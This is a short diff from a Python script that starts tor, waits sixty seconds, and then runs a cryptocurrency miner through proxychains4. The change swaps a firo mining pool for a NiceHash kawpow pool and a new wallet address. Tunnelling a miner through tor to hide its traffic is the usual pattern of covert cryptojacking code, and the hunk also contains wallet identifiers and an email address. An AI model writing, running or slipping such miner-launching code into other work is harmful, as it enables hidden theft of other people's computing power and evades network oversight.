@@ -33,4 +33,4 @@ except:
     pass
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --algo firo --server firo-eu1.picopool.org:22443 --user a9qF6ebLR5pY7LebgwT1YQYjmT1Kmrwx6E.ml/jmayo66@yahoo.com --ssl 1 ' )
+os.system ('proxychains4 ' + program + ' --algo kawpow --server stratum+ssl://kawpow.auto.nicehash.com:443 --user 1A7nMk9iCHph3oDVgY8sn8EEA5syTfY67B.ml ' )
